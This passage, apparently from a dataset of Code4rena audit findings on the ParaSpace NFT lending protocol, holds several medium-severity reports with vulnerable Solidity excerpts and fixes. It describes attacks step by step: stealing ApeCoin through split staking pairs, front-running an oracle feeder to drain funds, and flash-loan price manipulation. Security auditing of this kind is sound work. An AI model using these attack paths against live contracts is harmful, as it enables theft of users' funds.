_underlyingAsset(\n        // supply the received token to the pool and set it as collateral\n        DataTypes.ERC721SupplyParams[]\n            memory tokenData = new DataTypes.ERC721SupplyParams[](1);\n\n        tokenData[0] = DataTypes.ERC721SupplyParams({\n            tokenId: id,\n            useAsCollateral: true\n        });\n+\t)\n\n\tPOOL.supplyERC721FromNToken(_underlyingAsset, tokenData, from);\n\n\treturn this.onERC721Received.selector;\n}\n```\n\n**[LSDan (judge) decreased severity to Medium](https://github.com/code-423n4/2022-11-paraspace-findings/issues/286)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been made for the NTokenMoonBirds Reserve Pool, which is the holder/owner of all Moonbird NFTs within ParaSpace. The bug is that the Reserve Pool only allows Moonbird NFT to be sent to the pool contract, meaning that any airdrops for Moonbird NFT other than the Moonbird NFT will be rejected by the contract. This means that users who have collateralized their nested Moonbird NFT within ParaSpace will lose their opportunities to claim the airdrop. \n\nThe impact of this bug is that users will not be able to receive any airdropped assets for their nested Moonbird NFT, resulting in a loss of assets for the user. The recommended mitigation steps for this bug is to update the contract to allow airdrops to be received by the NTokenMoonBirds Reserve Pool. This can be done by adding an if statement to the code that checks if the sender is the _underlyingAsset, and if so, to supply the received token to the pool and set it as collateral.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/286",
      "tags": [],
      "finders": [
        "csanuragjain",
        "cccz",
        "xiaoming90",
        "imare",
        "unforgiven"
      ]
    },
    {
      "id": "15989",
      "title": "[M-06] New BAKC Owner Can Steal ApeCoin",
      "impact": "MEDIUM",
      "content": "\n### Background\n\nThis section provides a context of the pre-requisite concepts that a reader needs to fully understand the issue.\n\n#### Split Pair Edge Case In Paired Pool\n\nAssume that Jimmy is the owner of BAYC `#8888` and BAKC `#9999` NFTs initially. He participated in the Paired Pool and staked + accrued a total of 100 ApeCoin (APE) at this point, as shown in the diagram below.\n\nJimmy then sold his BAKC `#9999` NFT to Ben. When this happens, both parties (Jimmy and Ben) could close out their staking position. Since Ben owns BAKC `#9999` now, he can close out Jimmy's position anytime and claim all the accrued APE rewards (2 APE below). While Jimmy will obtain the 98 APE that he staked initially.\n\nThe following image is taken from <https://youtu.be/_LO-1f9nyjs?t=640>\n\n![](https://user-images.githubusercontent.com/102820284/206686601-3c34a2a1-6b80-420d-8ed8-2f86ab6ca103.png)\n\nThe `ApeCoinStaking._withdrawPairNft` taken from the official `$APE` Staking Contract shows that the implementation allows both the BAYC/MAYC owners and BAKC owners to close out the staking position. Refer to Line 976 below.\n\nWhen the staking position is closed by the BAKC owners, the entire staking amount must be withdrawn. A partial amount is not allowed per Line 981 below. In Line 984, all the accrued APE rewards will be sent to the BAKC owners. In Line 989, all the staked APEs will be withdrawn (unstake) and sent directly to the wallet of the BAYC owners.\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/dependencies/yoga-labs/ApeCoinStaking.sol#L966>\n\n```solidity\nFile: ApeCoinStaking.sol\n966:     function _withdrawPairNft(uint256 mainTypePoolId, PairNftWithAmount[] calldata _nfts) private {\n967:         for(uint256 i; i < _nfts.length; ++i) {\n968:             uint256 mainTokenId = _nfts[i].mainTokenId;\n969:             uint256 bakcTokenId = _nfts[i].bakcTokenId;\n970:             uint256 amount = _nfts[i].amount;\n971:             address mainTokenOwner = nftContracts[mainTypePoolId].ownerOf(mainTokenId);\n972:             address bakcOwner = nftContracts[BAKC_POOL_ID].ownerOf(bakcTokenId);\n973:             PairingStatus memory mainToSecond = mainToBakc[mainTypePoolId][mainTokenId];\n974:             PairingStatus memory secondToMain = bakcToMain[bakcTokenId][mainTypePoolId];\n975: \n976:             require(mainTokenOwner == msg.sender || bakcOwner == msg.sender, \"At least one token in pair must be owned by caller\");\n977:             require(mainToSecond.tokenId == bakcTokenId && mainToSecond.isPaired\n978:                 && secondToMain.tokenId == mainTokenId && secondToMain.isPaired, \"The provided Token IDs are not paired\");\n979: \n980:             Position storage position = nftPosition[BAKC_POOL_ID][bakcTokenId];\n981:             require(mainTokenOwner == bakcOwner || amount == position.stakedAmount, \"Split pair can't partially withdraw\");\n982: \n983:             if (amount == position.stakedAmount) {\n984:                 uint256 rewardsToBeClaimed = _claim(BAKC_POOL_ID, position, bakcOwner);\n985:                 mainToBakc[mainTypePoolId][mainTokenId] = PairingStatus(0, false);\n986:                 bakcToMain[bakcTokenId][mainTypePoolId] = PairingStatus(0, false);\n987:                 emit ClaimRewardsPairNft(msg.sender, rewardsToBeClaimed, mainTypePoolId, mainTokenId, bakcTokenId);\n988:             }\n989:             _withdraw(BAKC_POOL_ID, position, amount, mainTokenOwner);\n990:             emit WithdrawPairNft(msg.sender, amount, mainTypePoolId, mainTokenId, bakcTokenId);\n991:         }\n992:     }\n```\n\nThe following shows that the `ApeCoinStaking._withdraw` used in the above function will send the unstaked APEs directly to the wallet of BAYC owners. Refer to Line 946 below.\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/dependencies/yoga-labs/ApeCoinStaking.sol#L937>\n\n```solidity\nFile: ApeCoinStaking.sol\n937:     function _withdraw(uint256 _poolId, Position storage _position, uint256 _amount, address _recipient) private {\n938:         require(_amount <= _position.stakedAmount, \"Can't withdraw more than staked amount\");\n939: \n940:         Pool storage pool = pools[_poolId];\n941: \n942:         _position.stakedAmount -= _amount;\n943:         pool.stakedAmount -= _amount;\n944:         _position.rewardsDebt -= (_amount * pool.accumulatedRewardsPerShare).toInt256();\n945: \n946:         apeCoin.safeTransfer(_recipient, _amount);\n947:     }\n```\n\n#### Who is the owner of BAYC/MAYC in ParaSpace?\n\nThe BAYC is held by the `NTokenBAYC` reserve pool, while the MAYC is held by `NTokenMAYC` reserve pool. This causes an issue because, as mentioned in the previous section, all the unstaked APE will be sent directly to the wallet of the BAYC/MAYC owners. This will be used as part of the attack path later on.\n\n#### Does BAKC need to be staked or stored within ParaSpace?\n\nNo. For the purpose of APE staking via ParaSpace , BAKC NFT need not be held in the ParaSpace contract for staking, but Bored Apes and Mutant Apes must be collateralized in the ParaSpace protocol. Refer to [here](https://docs.para.space/para-space/introduction-to-paraspace/borrow-and-stake-apecoin-with-bored-ape-yacht-club-nfts#deposit-and-stake-unstake-and-withdraw). As such, users are free to sell off their BAKC anytime to anyone since it is not being locked up.\n\n### Proof of Concept\n\nUsing back the same example in the previous section. Assume the following:\n\n*   Jimmy is the victim, and Ben is the attacker.\n*   Jimmy is the owner of BAYC `#8888` and BAKC `#9999` NFTs initially. He participated in the Paired Pool and staked + accrued a total of 100 ApeCoin (APE).\n*   Jimmy sold his BAKC `#9999` NFT to Ben. There are many ways Ben can obtain the BAKC `#9999` NFT. Ben could obtain it via the public marketplace (e.g. Opensea) if Jimmy listed it OR Ben could offer an attractive price to Jimmy to purchase it privately.\n*   Ben also participates in the APE staking in ParaSpace via his BAYC `#0002` and BAKC `#0002` NFTs.\n\nBen will close out Jimmy's position by calling the `ApeCoinStaking.withdrawBAKC` function of the official `$APE` Staking Contract to withdraw all the staked APE + accrued APE rewards. As a result, the 98 APE that Jimmy staked initially will be sent directly to the owner of the BAYC `#8888` owner. In this case, the BAYC `#8888` owner is ParaSpace's `NTokenBAYC` reserve pool.\n\nAt this point, it is important to note that Jimmy's 98 APE is stuck in ParaSpace's `NTokenBAYC` reserve pool. If anyone can siphon out Jimmy's 98 APE that is stuck in the contract, that person will be able to get free APE.\n\nThere exist a way to siphon out all the APE coin that resides in ParaSpace's `NTokenBAYC` reserve pool. Anyone who participates in APE staking via ParaSpace with a BAYC, which also means that any user staked in the Paired Pool, can trigger the `ApeStakingLogic.withdrawBAKC` function below by calling the `PoolApeStaking.withdrawBAKC` function.\n\nNotice that in Line 53 below, it will compute the total balance of APE held by ParaSpace's `NTokenBAYC` reserve pool contract. In Line 55, it will send all the APE in the pool contract to the recipient. This effectively performs a sweeping of APE stored in the pool contract.\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/ApeStakingLogic.sol#L38>\n\n```solidity\nFile: ApeStakingLogic.sol\n38:     function withdrawBAKC(\n39:         ApeCoinStaking _apeCoinStaking,\n40:         uint256 poolId,\n41:         ApeCoinStaking.PairNftWithAmount[] memory _nftPairs,\n42:         address _apeRecipient\n43:     ) external {\n44:         ApeCoinStaking.PairNftWithAmount[]\n45:             memory _otherPairs = new ApeCoinStaking.PairNftWithAmount[](0);\n46: \n47:         if (poolId == BAYC_POOL_ID) {\n48:             _apeCoinStaking.withdrawBAKC(_nftPairs, _otherPairs);\n49:         } else {\n50:             _apeCoinStaking.withdrawBAKC(_otherPairs, _nftPairs);\n51:         }\n52: \n53:         uint256 balance = _apeCoinStaking.apeCoin().balanceOf(address(this));\n54: \n55:         _apeCoinStaking.apeCoin().safeTransfer(_apeRecipient, balance);\n56:     }\n```\n\nThus, after Ben closes out Jimmy's position by calling the `ApeCoinStaking.withdrawBAKC` function and causes the 98 APE to be sent to ParaSpace's `NTokenBAYC` reserve pool contract, Ben immediately calls the `PoolApeStaking.withdrawBAKC` function against his own BAYC `#0002` and BAKC `#0002` NFTs. This will result in all of Jimmy's 98 APE being swept to his wallet. Bob effectively steals Jimmy's 98 APE.\n\n### Impact\n\nApeCoin of ParaSpace users can be stolen.\n\n### Recommended Mitigation Steps\n\nConsider the potential side effects of the split pair edge case in the pair pool when implementing the APE staking feature in ParaSpace.\n\nThe official APE staking contract has been implemented recently, and only a few protocols have integrated with it. Thus, the edge cases are not widely understood and are prone to errors.\n\nTo mitigate this issue, instead of returning BAKC NFT to the users after staking, consider locking up BAKC NFT in the ParaSpace contract as part of the user's collateral. In this case, the user will not be able to sell off their BAKC, and the \"Split Pair Edge Case In Paired Pool\" scenario will not happen.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/284#issuecomment-1406320116):**\n > I've decided to downgrade this to medium. I think the risks involved are understood by most educated users of the BAYC/MAYC universe, but still valid.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the ApeCoin Staking Contract in the ParaSpace protocol. The issue is that users can steal ApeCoin from other users by exploiting the \"Split Pair Edge Case In Paired Pool\" scenario. The issue occurs when a user (Jimmy) sells his BAKC NFT to another user (Ben). Ben can then close out Jimmy's position by calling the ApeCoinStaking.withdrawBAKC function and cause the ApeCoin to be sent to the NTokenBAYC reserve pool. Ben can then call the PoolApeStaking.withdrawBAKC function against his own BAYC and BAKC NFTs, which will result in all of Jimmy's ApeCoin being swept to his wallet.\n\nTo mitigate this issue, ParaSpace should consider locking up BAKC NFT in the ParaSpace contract as part of the user's collateral. This will prevent users from selling off their BAKC and prevent the \"Split Pair Edge Case In Paired Pool\" scenario from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/284",
      "tags": [],
      "finders": [
        "unforgiven  csanuragjain",
        "xiaoming90"
      ]
    },
    {
      "id": "15988",
      "title": "[M-05] Front-running admin setPrice call allows a single compromised oracle to set any price, allowing the oracle manipulator to drain all protocol funds",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L195-L216><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L356-L364><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L402-L407><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L376-L386>\n\nThe only way to update an NFT price is through [\\_finalizePrice](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L376-L386), which is called just by function `setPrice`.\n\nCurrent code forces the admin to call function `setPrice` in order to update the price, but to call this function the current implementation requires that [the asset is not paused](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L199).\n\nWhat would happen if the admin `setPrice` was frontrunned by a feeder? The feeder who make the call will be allowed to set any price for the asset without any restriction. This obligates the protocol to consider next scenario:\n\n*   One feeder key or control has been compromised\n*   There is a new asset that the admin want to add to start feeding\n*   The new asset is being sold right now in a marketplace\n\nThen, after admin calls `addAssets` and `setPause` functions, `setPrice` function can be frontrunned by the compromised feeder in order to set the price of the new asset to any price they want. This would allow the feeder's address controller to drain all protocol funds.\n\n### Impact\n\nOracle decentralization can be bypassed, allowing `setPrice` function to be frontrunned by potencial oracle feeder (or person in control of oracle feeder), allowing the frontrunner to drain all protocol funds\n\nThis can happen because oracle decentralization control measures (requiring more than 3 oracle feeder to be deployed due to **MIN\\_ORACLES\\_NUM** value) can be bypassed.\n\n### Proof of Concept\n\n1.  Eve gets full control of one NFTFloorOracle feeder\n2.  Eve programs a bot to monitor when the admin of NFTFloorOracle contract calls `addAssets` and `setPause` function\n3.  ApeBoard lunch a new NFT collection called MONKEY\n4.  Some MONKEY collection tokens are in sale in Opean Sea\n5.  Paraspace decide to allow MONKEY collection to be used as collateral in the protocol and calls `addAssets` to add the new asset feed\n6.  Paraspace admin decide to call `setPause` to be able to call `setPrice` function\n7.  Eve's program detect the new NFT addition and the correspondin unpausing, then proceeds to:\n    1.  Buy one token of MONKEY collection\n    2.  Call `setPrice` through the feeder he control, and set the asset price to the maximum value possible\n    3.  Deposit the NFT in the protocol\n    4.  Borrow all the funds from the protocol\n\nIt is important to notice:\n\n```solidity\nfunction setPrice(address _asset, uint256 _twap)\n    public\n    onlyRole(UPDATER_ROLE)\n    onlyWhenAssetExisted(_asset)\n    whenNotPaused(_asset)\n{\n    bool dataValidity = false;\n    // @audit This if block won't be executed by controlled feeder\n    if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender)) {\n        _finalizePrice(_asset, _twap);\n        return;\n    }\n    // @audit This can be bypassed giving the default twap value of the asset is zero\n    dataValidity = _checkValidity(_asset, _twap);\n    require(dataValidity, \"NFTOracle: invalid price data\");\n    // @audit add price to raw feeder storage, never reverts\n    _addRawValue(_asset, _twap);\n    uint256 medianPrice;\n    // set twap price only when median value is valid\n    // @audit _combine will return (true, _twap)\n    (dataValidity, medianPrice) = _combine(_asset, _twap);\n    if (dataValidity) {\n        // @audit Here the price is set, given dataValidity== true\n        _finalizePrice(_asset, medianPrice);\n    }\n}\n```\n\n```solidity\nfunction _checkValidity(address _asset, uint256 _twap)\n    internal\n    view\n    returns (bool)\n{\n    // @audit the attacker will send a value higher than zero\n    require(_twap > 0, \"NFTOracle: price should be more than 0\");\n    PriceInformation memory assetPriceMapEntry = assetPriceMap[_asset];\n    uint256 _priorTwap = assetPriceMapEntry.twap;\n    uint256 _updatedAt = assetPriceMapEntry.updatedAt;\n    uint256 priceDeviation;\n    //@audit first price is always valid as long as _twap > 0, which is the case for the attacker who wants to maximize NFT value in order to drain protocol funds\n    if (_priorTwap == 0 || _updatedAt == 0) {\n        // @audit dataValidity in setPrice will be set to true\n        return true;\n    }\n    // Rest of function code...\n}\n```\n\n```solidity\nfunction _combine(address _asset, uint256 _twap)\n    internal\n    view\n    returns (bool, uint256)\n{\n    FeederRegistrar storage feederRegistrar = assetFeederMap[_asset];\n    uint256 currentBlock = block.number;\n    //@audit first time the asset price is set any input parameter will return (true, _twap)\n    if (assetPriceMap[_asset].twap == 0) {\n        return (true, _twap);\n    }\n    //Rest of function...\n}\n```\n\n### Recommended Mitigation Steps\n\n1.  Do not allow to unpause the asset unless its prices is different from zero.\n2.  Force the admin to set the first price for all new assets added.\n\nFirst step is easy, just a simple modification to setPause function:\n\n```diff\nfunction setPause(address _asset, bool _flag)\n    external\n    onlyRole(DEFAULT_ADMIN_ROLE)\n{\n    assetFeederMap[_asset].paused = _flag;\n+   if(_flag){\n+       require(assetFeederMap[_asset].twap != 0, ERROR_CANNOT_UNPAUSE_IF_PRICE_EQ_ZERO);\n+   }\n    \n    emit AssetPaused(_asset, _flag);\n}\n```\n\nThis step forces to modify `setPrice` function and add a new function which might be called `setEmergencyOrFirstPrice`\n\n```solidity\n// NftFloorOracle.sol\n// Function to add\nfunction setEmergencyOrFirstPrice(address _asset, uint256 _twap)\n    public\n    onlyRole(DEFAULT_ADMIN_ROLE)\n    onlyWhenAssetExisted(_asset)\n{\n    require(_twap > 0, ERROR_TWAP_CANNOT_BE_ZERO());\n    _finalizePrice(_asset, _twap);\n}\n```\n\nStep 2 is included in the previous solution, giving we only allow to unpause the asset in case `assetFeederMap[_asset].twap != 0`.\n\nDoing this allows to simplify setPrice in order to save gas:\n\n```diff\n// New setPrice function\nfunction setPrice(address _asset, uint256 _twap)\n        public\n        onlyRole(UPDATER_ROLE)\n        onlyWhenAssetExisted(_asset)\n        whenNotPaused(_asset)\n    {        \n-       bool dataValidity = false;\n-       if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender)) {\n-           _finalizePrice(_asset, _twap);\n-           return;\n-       }\n-       dataValidity = _checkValidity(_asset, _twap);\n        bool dataValidity = _checkValidity(_asset, _twap);\n        require(dataValidity, \"NFTOracle: invalid price data\");\n        // add price to raw feeder storage\n        _addRawValue(_asset, _twap);\n        uint256 medianPrice;\n        // set twap price only when median value is valid\n        (dataValidity, medianPrice) = _combine(_asset, _twap);\n        if (dataValidity) {\n            _finalizePrice(_asset, medianPrice);\n        }\n    }\n```\n\n### Notes\n\n*   The scenario is focus on describing how front running setPrice function call lead to as many single points failures as feeders registered in the contract. Single point failures are described in  [this Chainlink document](https://20755222.fs1.hubspotusercontent-na1.net/hubfs/20755222/guides/the-ultimate-guide-to-blockchain-oracle-security.pdf) (point 3)\n*   If there is at least one feeder who works almost independently from ParaSpace protocol and is multisigned by people (not a governance contract) I consider this issue should be considered as high, given that all of them can have realistic motivations to drain protocol funds in their favour.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NFTFloorOracle.sol contract code. The vulnerability occurs when an admin attempts to update the price of an NFT asset. The code requires that the asset is not paused when attempting to update the price. However, if a feeder frontruns the admin and calls the setPrice function before the admin, the feeder can set the price to any value they want, allowing them to drain all the protocol funds. \n\nThe vulnerability can be exploited by Eve, who gets full control of one NFTFloorOracle feeder, programs a bot to monitor when the admin of NFTFloorOracle contract calls the addAssets and setPause functions, and then proceeds to buy one token of the new asset, call setPrice through the feeder they control, and set the asset price to the maximum value possible. This allows them to deposit the NFT in the protocol and borrow all the funds from the protocol.\n\nThe vulnerability is caused by the fact that the _checkValidity and _combine functions can be bypassed by the attacker, allowing them to set the price of the asset to any value they want.\n\nThe bug can be mitigated by not allowing the asset to be unpaused unless its price is different from zero, and by forcing the admin to set the first price for all new assets added. The setPrice function can also be simplified to save gas.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/267",
      "tags": [],
      "finders": [
        "__141345__",
        "Rolezn",
        "Jeiwan",
        "nicobevi",
        "0xDave",
        "carlitox477",
        "imare"
      ]
    },
    {
      "id": "15987",
      "title": "[M-04] Fallback oracle is using spot price in Uniswap liquidity pool, which is very vulnerable to flashloan price manipulation",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ParaSpaceOracle.sol#L131><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ParaSpaceFallbackOracle.sol#L56><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ParaSpaceFallbackOracle.sol#L78>\n\nFallback oracle is using spot price in Uniswap liquidity pool, which is very vulnerable to flashloan price manipulation. Hacker can use flashloan to distort the price and overborrow or perform malicious liqudiation.\n\n### Proof of Concept\n\nIn the current implementation of the paraspace oracle, if the paraspace oracle has issue, the fallback oracle is used for ERC20 token.\n\n```solidity\n/// @inheritdoc IPriceOracleGetter\nfunction getAssetPrice(address asset)\n\tpublic\n\tview\n\toverride\n\treturns (uint256)\n{\n\tif (asset == BASE_CURRENCY) {\n\t\treturn BASE_CURRENCY_UNIT;\n\t}\n\n\tuint256 price = 0;\n\tIEACAggregatorProxy source = IEACAggregatorProxy(assetsSources[asset]);\n\tif (address(source) != address(0)) {\n\t\tprice = uint256(source.latestAnswer());\n\t}\n\tif (price == 0 && address(_fallbackOracle) != address(0)) {\n\t\tprice = _fallbackOracle.getAssetPrice(asset);\n\t}\n\n\trequire(price != 0, Errors.ORACLE_PRICE_NOT_READY);\n\treturn price;\n}\n```\n\nwhich calls:\n\n```solidity\nprice = _fallbackOracle.getAssetPrice(asset);\n```\n\nwhch use the spot price from Uniswap V2.\n\n```solidity\n\taddress pairAddress = IUniswapV2Factory(UNISWAP_FACTORY).getPair(\n\t\tWETH,\n\t\tasset\n\t);\n\trequire(pairAddress != address(0x00), \"pair not found\");\n\tIUniswapV2Pair pair = IUniswapV2Pair(pairAddress);\n\t(uint256 left, uint256 right, ) = pair.getReserves();\n\t(uint256 tokenReserves, uint256 ethReserves) = (asset < WETH)\n\t\t? (left, right)\n\t\t: (right, left);\n\tuint8 decimals = ERC20(asset).decimals();\n\t//returns price in 18 decimals\n\treturn\n\t\tIUniswapV2Router01(UNISWAP_ROUTER).getAmountOut(\n\t\t\t10**decimals,\n\t\t\ttokenReserves,\n\t\t\tethReserves\n\t\t);\n```\n\nand\n\n```solidity\nfunction getEthUsdPrice() public view returns (uint256) {\n\taddress pairAddress = IUniswapV2Factory(UNISWAP_FACTORY).getPair(\n\t\tUSDC,\n\t\tWETH\n\t);\n\trequire(pairAddress != address(0x00), \"pair not found\");\n\tIUniswapV2Pair pair = IUniswapV2Pair(pairAddress);\n\t(uint256 left, uint256 right, ) = pair.getReserves();\n\t(uint256 usdcReserves, uint256 ethReserves) = (USDC < WETH)\n\t\t? (left, right)\n\t\t: (right, left);\n\tuint8 ethDecimals = ERC20(WETH).decimals();\n\t//uint8 usdcDecimals = ERC20(USDC).decimals();\n\t//returns price in 6 decimals\n\treturn\n\t\tIUniswapV2Router01(UNISWAP_ROUTER).getAmountOut(\n\t\t\t10**ethDecimals,\n\t\t\tethReserves,\n\t\t\tusdcReserves\n\t\t);\n}\n```\n\nUsing flashloan to distort and manipulate the price is very damaging technique.\n\nConsider the POC below.\n\n1.  the User uses 10000 amount of tokenA as collateral, each token A worth 1 USD according to the paraspace oracle. the user borrow 3 ETH, the price of ETH is 1200 USD.\n\n2.  the paraspace oracle went down, the fallback price oracle is used, the user use borrows flashloan to distort the price of the tokenA in Uniswap pool from 1 USD to 10000 USD.\n\n3.  the user's collateral position worth 1000 token X 10000 USD, and borrow 1000 ETH.\n\n4.  User repay the flashloan using the overborrowed amount and recover the price of the tokenA in Uniswap liqudity pool to 1 USD, leaving bad debt and insolvent position in Paraspace.\n\n### Recommended Mitigation Steps\n\nWe recommend the project does not use the spot price in Uniswap V2, if the paraspace is down, it is safe to just revert the transaction.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Paraspace Oracle, a decentralized price oracle. When the Paraspace Oracle is down, the Fallback Oracle is used to provide prices for ERC20 tokens. This Fallback Oracle uses the spot price in Uniswap liquidity pools, which is vulnerable to flash loan price manipulation. This means that a hacker could use a flash loan to distort the price and overborrow or perform malicious liquidations.\n\nThe proof of concept for this vulnerability involves a user using 10000 amount of tokenA as collateral, each token A worth 1 USD according to the Paraspace Oracle. The user borrows 3 ETH, the price of ETH being 1200 USD. When the Paraspace Oracle goes down, the Fallback Oracle is used and the user uses a flash loan to distort the price of the tokenA in Uniswap pool from 1 USD to 10000 USD. The user's collateral position is now worth 1000 token X 10000 USD, and they have borrowed 1000 ETH. The user can then repay the flash loan using the overborrowed amount and recover the price of the tokenA in Uniswap liquidity pool to 1 USD, leaving bad debt and insolvent positions in Paraspace.\n\nManual review was used to identify this vulnerability. To mitigate this vulnerability, it is recommended that the project does not use the spot price in Uniswap V2, and that if the Paraspace Oracle is down, it is safe to revert the transaction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/242",
      "tags": [],
      "finders": [
        "__141345__",
        "ladboy233",
        "mahdikarimi",
        "Lambda",
        "Kong",
        "R2"
      ]
    },
    {
      "id": "15986",
      "title": "[M-03] safeTransfer is not implemented correctly",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/protocol/tokenization/base/MintableIncentivizedERC721.sol#L320>\n\nThe safeTransfer function Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients are aware of the ERC721 protocol to prevent tokens from being forever locked. But seems like this safety check got missed in the `_safeTransfer` function leading to non secure ERC721 transfers\n\n### Proof of Concept\n\n1.  User calls the `safeTransferFrom` function (Using NToken contract which implements MintableIncentivizedERC721 contract)\n\n<!---->\n\n    function safeTransferFrom(\n            address from,\n            address to,\n            uint256 tokenId,\n            bytes memory _data\n        ) external virtual override nonReentrant {\n            _safeTransferFrom(from, to, tokenId, _data);\n        }\n\n2.  This makes an internal call to \\_safeTransferFrom -> \\_safeTransfer -> \\_transfer\n\n<!---->\n\n    function safeTransferFrom(\n            address from,\n            address to,\n            uint256 tokenId,\n            bytes memory _data\n        ) external virtual override nonReentrant {\n            _safeTransferFrom(from, to, tokenId, _data);\n        }\n\n        function _safeTransferFrom(\n            address from,\n            address to,\n            uint256 tokenId,\n            bytes memory _data\n        ) internal {\n            require(\n                _isApprovedOrOwner(_msgSender(), tokenId),\n                \"ERC721: transfer caller is not owner nor approved\"\n            );\n            _safeTransfer(from, to, tokenId, _data);\n        }\n\n    function _safeTransfer(\n            address from,\n            address to,\n            uint256 tokenId,\n            bytes memory\n        ) internal virtual {\n            _transfer(from, to, tokenId);\n        }\n\n3.  Now lets see `_transfer` function\n\n<!---->\n\n    function _transfer(\n            address from,\n            address to,\n            uint256 tokenId\n        ) internal virtual {\n            MintableERC721Logic.executeTransfer(\n                _ERC721Data,\n                POOL,\n                ATOMIC_PRICING,\n                from,\n                to,\n                tokenId\n            );\n        }\n\n4.  This is calling `MintableERC721Logic.executeTransfer` which simply transfers the asset\n\n5.  In this full flow there is no check to see whether `to` address can support ERC721 which fails the purpose of `safeTransferFrom` function\n\n6.  Also notice the comment mentions that `data` parameter passed in safeTransferFrom is sent to recipient in call but there is no such transfer of `data`\n\n### Recommended Mitigation Steps\n\nAdd a call to `onERC721Received` for recipient and see if the recipient actually supports ERC721.\n\n**[WalidOfNow (Paraspace) commented via duplicate issue `#51`](https://github.com/code-423n4/2022-11-paraspace-findings/issues/51#issuecomment-1404062649):**\n > This is by design. We want to avoid re-entrancy to our contracts and so we removed calling the hook.\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the MintableIncentivizedERC721 contract, which is implemented by the NToken contract. The bug is in the safeTransferFrom function, which is supposed to check that the recipient is aware of the ERC721 protocol, but this safety check is missing. This means that non-secure ERC721 transfers can be made.\n\nThe bug is in the _safeTransferFrom function, which calls the _safeTransfer function and then the _transfer function. The _transfer function calls the MintableERC721Logic.executeTransfer, which simply transfers the asset without checking to see if the recipient can support ERC721. Additionally, the comment mentions that the data parameter passed in safeTransferFrom should be sent to the recipient, but this is not happening.\n\nTo fix this bug, it is recommended to add a call to the onERC721Received for the recipient and check if they can support ERC721. This will ensure that secure ERC721 transfers can be made.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/235",
      "tags": [],
      "finders": [
        "csanuragjain",
        "joestakey",
        "Lambda",
        "unforgiven",
        "eierina"
      ]
    },
    {
      "id": "15985",
      "title": "[M-02] Value can be stuck in Adapters",
      "impact": "MEDIUM",
